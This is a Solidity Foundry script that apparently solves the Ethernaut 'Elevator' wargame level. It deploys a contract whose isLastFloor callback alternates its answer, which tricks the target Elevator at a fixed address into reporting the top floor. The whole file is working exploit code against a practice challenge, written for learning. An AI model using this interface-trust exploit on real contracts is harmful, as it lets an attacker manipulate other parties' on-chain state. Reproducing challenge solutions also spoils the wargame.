// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "lib/forge-std/src/Script.sol";
import {Elevator} from "../src/Elevator.sol";

contract Interfaced {
    bool toggle = true;
    Elevator public elevator = Elevator(0xB8cc8A8314ACE548a5776544Cb6f189a28bAAE6b);

    function isLastFloor(uint256) external returns (bool){
        toggle = !toggle;
        return toggle;
    }

    function attack() public returns (bool){
        elevator.goTo(1);
        return elevator.top();
    }
}

contract ElevatorSolution is Script {
    Interfaced public interfaced;

    function run() external {
        vm.startBroadcast();

        console.log("Solving Elevator...");

        interfaced = new Interfaced();

        console.log("Is Last Floor: ", interfaced.attack());

        vm.stopBroadcast();
        console.log("Elevator Solved!");
    }
}
